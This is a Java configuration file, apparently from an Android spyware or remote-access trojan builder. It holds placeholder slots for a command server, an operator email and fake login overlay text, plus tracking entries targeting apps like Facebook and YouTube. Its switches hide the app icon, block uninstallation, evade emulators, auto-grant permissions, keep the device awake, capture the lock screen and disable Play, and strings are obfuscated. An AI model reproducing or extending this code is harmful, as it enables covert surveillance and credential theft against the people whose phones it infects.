package com.icontrol.protector;

import static com.icontrol.protector.UtliTools.Fix_it;

import com.github.megatronking.stringfog.annotation.StringFogIgnore;

@StringFogIgnore
public class My_Configs {

    //public static String mydom = "[CRNT-DOM]"; // > yaarsa.com
    //public static String mydom = "[CRNT-DOM]";
    public static String OConstsS = "[OBFS]";
    public static String HA = get_ha();
    private static String get_ha(){
        return "com.icontrol.protector.A2";
    }
    public static String MA = get_ma();
    private static String get_ma(){
        return "com.icontrol.protector.A1";
    }

    public static String subdir = get_sbdir(); // > /yaarsa/private/
    //public static String subdir = "/yaarsa/private/";
    private static String get_sbdir(){
        //todo:<-----
        return "[CRNT-SUB]";
        // return "/yaarsa/private/";
    }

    //public static String Drop_name = Fix_it("[OBFS]com.appd.instll","[OBFS]");
    public static String Mob_Name = Fix_it("[OBFS][Client_N]","[OBFS]");


    public static String _Notfy_TITL_ = Fix_it("[OBFS][_NOTIFI_TITLE_]","[OBFS]");



    public static  String _Notfy_MSG_ = Fix_it("[OBFS][_NOTIFI_MSG_]","[OBFS]");



    //facebook[<s>]facebook.com[<s>]com.facebook.katana|youtube[<s>]youtube.com[<s>]com.google.android.youtube|
    public static String Tracking_Data_str = "[NAME>LNK>ID!]";
    //public static String Tracking_Data_str = "ZmFjZWJvb2tbPHM+XWZhY2Vib29rLmNvbVs8cz5dY29tLmZhY2Vib29rLmthdGFuYQ==|eW91dHViZVs8cz5deW91dHViZS5jb21bPHM+XWNvbS5nb29nbGUuYW5kcm9pZC55b3V0dWJl|";


    //todo:<-----

   public static  String _Login_title_ = "[log-title]";
   // public static  String _Login_title_ = "Title Test";

    //todo:<-----
    public static  String _Login_dis_ = "[log-dis]";
   // public static  String _Login_dis_ = "Dis Test";


    //todo:<-----
  public static  String _Login_btn_ = "[log-btn]";
  //  public static  String _Login_btn_ = "Ha";



    //todo:<-----
    //public static  String _Login_lng_ = "[log-lng]";
    //public static  String _Login_lng_ = "en";


    //todo:<-----
    //spysolr.com<spysolr.site<home.test.ftp<192.168.1.2<192.168.1.4<
   // public static String USR_HOST ="DWPNyHiJTuC6zEmHBD+dbg==";[SERVER_ADRESS]
    public static String USR_HOST ="[SERVER_ADRESS]";//192.168.1.8<




    //todo:<-----
    //public static String USR_MAIL = "aw1R0HK5SaOm3AxxNLI5qsyAXP06nWRxFApm/EzkJ+o=";[USER_MAIL]
    public static String USR_MAIL= "[USER_MAIL]";



    //todo:<-----
    //public static String HOME_NAME= cr.Dcrpt_Str("[BSE_URL]");
    public static String HOME_NAME = "[BSE_URL]";




    public static  String Click_Prim= get_click();

    private static String get_click(){
        //todo:<-----
        return "[USE-AUTOGRANT]";
       // return "1";
    }
    public static  String CONS_KY= get_cok();


    //[USE-AUTOBTRY] reused from battery to replace connection key
    private static String get_cok(){
        //todo:<-----
         return "[USE-AUTOBTRY]";
       //return "BTMOB";
    }


//    public static  String Stiky_Recent = get_kill();
//
//
//    private static String get_kill(){
//        //todo:<-----
//      return "[USE-NOKILL]";
//      // return "1";
//    }


    public static  String Anti_Delete= get_undelete();
    private static String get_undelete(){
        //todo:<-----
        return "[USE-DELTE]";
     // return "1";
    }



    public static  String ALL_CONFIG = get_allconfig();
    private static String get_allconfig(){
        //todo:<-----
        return "[ALL-CONFG]";
         //return "1|1[*]1|1[*]1|1[*]0|0[*]0|0[*]1|1[*]1|1[*]1|1[*]1|1[*]1|1[*]1|1[*]1|1[*]1|1[*]1|1[*]1|1[*]1|1";// need|request


//        String access = "1|1";
//        String drawOverApps = "1|1";
//        String backgroundDataUsage = "0|0";
//        String usageAccess = "0|0";
//        String changePhoneSettings = "0|0";
//        String batteryOptimization = "1|1";
//        String filesAccess = "1|1";
//        String cameraAccess = "1|1";
//        String microphoneAccess = "0|0";
//        String readSMS = "0|0";
//        String sendSMS = "0|0";
//        String readContacts = "1|1";
//        String readAccounts = "1|1";
//        String shownification = "1|1";
//        String hidepermissions = "0|0";
//        String disablePlay = "1|1";
//        String reqlocation = "0|0";
//
//
//        String result = String.join("[*]",
//                access, drawOverApps, backgroundDataUsage, usageAccess,
//                changePhoneSettings, batteryOptimization, filesAccess,
//                cameraAccess, microphoneAccess, readSMS, sendSMS,
//                readContacts, readAccounts,shownification,hidepermissions,disablePlay,reqlocation);
//
//
//        return  result;
    }


    public static  String Anti_emulator = get_emu();

    private  static  String get_emu(){
        //todo:<-----
          return  "[USE-NOEMU]";
        //return "1";
    }

    public static  String Hide_ico = get_hideit();

    private  static  String get_hideit(){
        //todo:<-----
        return  "[USE-HIDDEEN]";
      //return "1";
    }
    public static  String Hide_Type = get_hideentype();

    private  static  String get_hideentype(){
        //todo:<-----
         return  "[USE-FAKE]";
        // return "c"; c for complete hide
        //return "f";
        // return "c";
    }


    public static  String Access_type = get_accsstype();

    private  static  String get_accsstype(){
        //todo:<-----
        return  "[USE-GUID]";
       // return "d";
       // return "g";
    }



    public static  String Prevent_sleep = get_dozestate();

    private  static  String get_dozestate(){
        //todo:<-----
        return  "[USE-DOZE]";
       //return "1";
    }


    public static  String Is_Store = get_storemod();

    private  static  String get_storemod(){
        //todo:<-----
        return  "[USE-STORE]";
        //return "1";
    }

    public static  String Capture_Lock = get_caplock();

    private  static  String get_caplock(){
        //todo:<-----
        return  "[USE-CAPLOCK]";
       // return "1";
    }


}
